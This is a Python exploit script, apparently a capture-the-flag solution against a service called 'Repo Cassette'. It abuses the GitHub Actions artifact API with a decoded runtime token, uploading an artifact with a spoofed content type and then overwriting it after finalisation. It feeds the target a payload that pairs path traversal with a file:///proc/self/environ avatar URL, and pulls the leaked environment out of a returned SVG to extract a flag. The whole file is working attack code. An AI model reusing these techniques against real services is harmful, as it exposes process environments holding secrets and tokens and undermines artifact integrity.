#!/usr/bin/env python3
"""Repo Cassette: create a GitHub Actions raw artifact and replay it."""

import argparse
import base64
import hashlib
import json
import os
import re
import sys
import time
import uuid
from urllib.error import HTTPError
from urllib.parse import urlsplit
from urllib.request import Request, urlopen


NEL_JSON = "\x85application/json"
ARTIFACT_SERVICE = "github.actions.results.api.v1.ArtifactService"


def repo_identifier(github_repository, artifact_id):
    owner, name = github_repository.split("/", 1)
    if not re.fullmatch(r"[A-Za-z0-9-]+", owner):
        raise ValueError("Invalid GitHub owner")
    if not re.fullmatch(r"[A-Za-z0-9._-]+", name):
        raise ValueError("Invalid GitHub repository")
    if not re.fullmatch(r"[0-9]+", str(artifact_id)):
        raise ValueError("Invalid artifact ID")
    return f"x/../../repos/{owner}/{name}/actions/artifacts/{artifact_id}/zip"


def payload(github_repository, artifact_id):
    document = {
        "full_name": repo_identifier(github_repository, artifact_id),
        "owner": {"login": "cassette", "avatar_url": "file:///proc/self/environ"},
        "description": "Repo Cassette",
    }
    return json.dumps(document, ensure_ascii=True, separators=(",", ":")).encode()


def request_json(url, data=None, headers=None, timeout=20):
    if data is not None:
        data = json.dumps(data, separators=(",", ":")).encode()
        headers = {"Content-Type": "application/json", **(headers or {})}
    with urlopen(Request(url, data=data, headers=headers or {}), timeout=timeout) as response:
        return json.load(response)


def backend_ids(runtime_token):
    parts = runtime_token.split(".")
    if len(parts) < 2:
        raise ValueError("ACTIONS_RUNTIME_TOKEN is not a JWT")
    claims = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
    for scope in claims.get("scp", "").split():
        fields = scope.split(":")
        if len(fields) == 3 and fields[0] == "Actions.Results":
            return fields[1], fields[2]
    raise ValueError("ACTIONS_RUNTIME_TOKEN has no Actions.Results scope")


def twirp(method, fields):
    token = os.environ["ACTIONS_RUNTIME_TOKEN"]
    parsed = urlsplit(os.environ["ACTIONS_RESULTS_URL"])
    url = f"{parsed.scheme}://{parsed.netloc}/twirp/{ARTIFACT_SERVICE}/{method}"
    result = request_json(url, fields, {"Authorization": f"Bearer {token}"})
    if not result.get("ok", method == "ListArtifacts"):
        raise RuntimeError(f"{method} failed: {result!r}")
    return result


def put_blob(signed_url, data):
    headers = {
        "x-ms-version": "2023-11-03",
        "x-ms-blob-type": "BlockBlob",
        "x-ms-blob-content-type": NEL_JSON,
        "Content-Type": "application/octet-stream",
    }
    with urlopen(Request(signed_url, data=data, headers=headers, method="PUT"), timeout=30) as response:
        if response.status not in (200, 201):
            raise RuntimeError(f"Blob upload returned {response.status}")


def finalize_artifact(common, name, data):
    request = {**common, "name": name, "size": str(len(data))}
    try:
        return twirp("FinalizeArtifact", request)
    except HTTPError as error:
        if error.code not in (400, 422):
            raise
        request["hash"] = "sha256:" + hashlib.sha256(data).hexdigest()
        return twirp("FinalizeArtifact", request)


def make_artifact(github_repository):
    run_id, job_id = backend_ids(os.environ["ACTIONS_RUNTIME_TOKEN"])
    common = {"workflow_run_backend_id": run_id, "workflow_job_run_backend_id": job_id}
    # Ask the artifact service to retain the unusual media type too. If it
    # validates MIME syntax, the Azure Blob header still provides the mismatch.
    extension = os.environ.get("CASSETTE_ARTIFACT_EXT", "json")
    if not re.fullmatch(r"[A-Za-z0-9]{1,12}", extension):
        raise ValueError("Invalid artifact extension")
    name = f"repo-cassette-{uuid.uuid4().hex[:12]}.{extension}"
    try:
        created = twirp("CreateArtifact", {**common, "name": name, "version": 7, "mime_type": NEL_JSON})
        print("create_mime=nel")
    except HTTPError as error:
        if error.code not in (400, 415, 422):
            raise
        print(f"nel_create_rejected_http={error.code}")
        name = f"repo-cassette-{uuid.uuid4().hex[:12]}.{extension}"
        created = twirp("CreateArtifact", {**common, "name": name, "version": 7, "mime_type": "application/json"})
        print("create_mime=json")
    signed_url = created["signed_upload_url"]

    # Some backends expose the database ID as soon as CreateArtifact returns.
    # If not, finalize a placeholder to learn it, then replace the blob using
    # the still-valid upload URL.
    pending_id = None
    try:
        listed = twirp("ListArtifacts", {**common, "name": name})
        for artifact in listed.get("artifacts", []):
            candidate = str(artifact.get("database_id", "0"))
            if artifact.get("name") == name and candidate.isdecimal() and int(candidate) > 0:
                pending_id = candidate
                break
    except Exception:
        pass

    if pending_id:
        body = payload(github_repository, pending_id)
        put_blob(signed_url, body)
        finalized = finalize_artifact(common, name, body)
        artifact_id = str(finalized["artifact_id"])
        if artifact_id != pending_id:
            raise RuntimeError("Finalized artifact ID differed from the pending ID")
    else:
        placeholder = b"{}"
        put_blob(signed_url, placeholder)
        finalized = finalize_artifact(common, name, placeholder)
        artifact_id = str(finalized["artifact_id"])
        print(f"finalized_artifact_id={artifact_id}")
        body = payload(github_repository, artifact_id)
        put_blob(signed_url, body)

    identifier = repo_identifier(github_repository, artifact_id)
    print(f"artifact_id={artifact_id}")
    print(f"repository={identifier}")
    print(f"sha256={hashlib.sha256(body).hexdigest()}")
    print("blob_content_type=" + repr(NEL_JSON))
    output_path = os.environ.get("GITHUB_OUTPUT")
    if output_path:
        with open(output_path, "a", encoding="utf-8") as stream:
            stream.write(f"artifact_id={artifact_id}\nrepository={identifier}\n")

    github_token = os.environ.get("GITHUB_TOKEN")
    if github_token:
        verify_artifact(github_repository, artifact_id, github_token, body)


def verify_artifact(github_repository, artifact_id, github_token, expected):
    # Follow the signed URL without sending the GitHub token to blob storage.
    from urllib.request import HTTPRedirectHandler, build_opener

    class StopRedirect(HTTPRedirectHandler):
        def redirect_request(self, request, fp, code, msg, headers, newurl):
            return None

    url = f"https://api.github.com/repos/{github_repository}/actions/artifacts/{artifact_id}/zip"
    request = Request(url, headers={"Authorization": f"Bearer {github_token}", "Accept": "application/vnd.github.v3+json"})
    opener = build_opener(StopRedirect)
    for attempt in range(15):
        try:
            try:
                with opener.open(request, timeout=20) as response:
                    location = response.headers.get("Location")
            except HTTPError as error:
                if error.code != 302:
                    raise
                location = error.headers.get("Location")
            if not location:
                raise RuntimeError("GitHub did not return a download URL")
            with urlopen(location, timeout=20) as response:
                actual = response.read()
                content_type = response.headers.get("Content-Type")
            if actual == expected and content_type == NEL_JSON:
                print("github_artifact_verified=true")
                return
            if actual != expected:
                raise RuntimeError("GitHub artifact bytes differ after the overwrite")
            raise RuntimeError(f"GitHub artifact Content-Type is {content_type!r}")
        except HTTPError as error:
            if error.code not in (404, 409, 410) or attempt == 14:
                raise
            time.sleep(2)
    raise RuntimeError("GitHub artifact did not become available")


def multipart(fields, file_field, filename, file_data):
    boundary = "cassette-" + uuid.uuid4().hex
    chunks = []
    for name, value in fields.items():
        chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
    chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; filename=\"{filename}\"\r\nContent-Type: application/json\r\n\r\n".encode())
    chunks.append(file_data)
    chunks.append(f"\r\n--{boundary}--\r\n".encode())
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"


def exploit(base, github_repository, artifact_id):
    base = base.rstrip("/")
    identifier = repo_identifier(github_repository, artifact_id)
    body = payload(github_repository, artifact_id)
    har = {"log": {"entries": [{"response": {"headers": [{"name": "Content-Type", "value": "application/json"}], "content": {"text": body.decode()}}}]}}
    form, content_type = multipart({"repository": identifier}, "capture", "capture.har", json.dumps(har).encode())
    with urlopen(Request(f"{base}/api/fixtures", data=form, headers={"Content-Type": content_type}), timeout=15) as response:
        fixture = json.load(response)
    fixture_id = fixture["id"]
    expected_hash = hashlib.sha256(body).hexdigest()
    if fixture.get("sourceSha256") != expected_hash:
        raise RuntimeError(f"Source hash mismatch: {fixture!r}")
    card = request_json(f"{base}/api/postcards/{fixture_id}")
    print(f"fixture_id={fixture_id}")
    print(f"postcard_verified={card.get('verified')}")
    if card.get("verified") is not True:
        raise RuntimeError(f"Postcard was not verified: {card!r}")
    with urlopen(f"{base}/api/postcards/{fixture_id}/image.svg", timeout=15) as response:
        svg = response.read()
    embedded = re.search(rb"data:[^;]+;base64,([^\"\s]+)", svg)
    if not embedded:
        raise RuntimeError("Verified postcard did not contain an embedded portrait")
    environ = base64.b64decode(embedded.group(1))
    flag = re.search(rb"(?:^|\x00)FLAG=([^\x00]+)", environ)
    if not flag:
        raise RuntimeError("FLAG was not present in the embedded portrait")
    print("flag=" + flag.group(1).decode("utf-8", errors="replace"))


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    modes = parser.add_subparsers(dest="mode", required=True)
    upload = modes.add_parser("upload", help="Run inside a GitHub Actions job")
    upload.add_argument("--github-repository", default=os.environ.get("GITHUB_REPOSITORY"), required=False)
    attack = modes.add_parser("exploit", help="Replay the uploaded artifact against Repo Cassette")
    attack.add_argument("--base", required=True)
    attack.add_argument("--github-repository", required=True)
    attack.add_argument("--artifact-id", required=True)
    args = parser.parse_args()
    if args.mode == "upload":
        if not args.github_repository:
            parser.error("GITHUB_REPOSITORY or --github-repository is required")
        make_artifact(args.github_repository)
    else:
        exploit(args.base, args.github_repository, args.artifact_id)


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"error: {error}", file=sys.stderr)
        raise
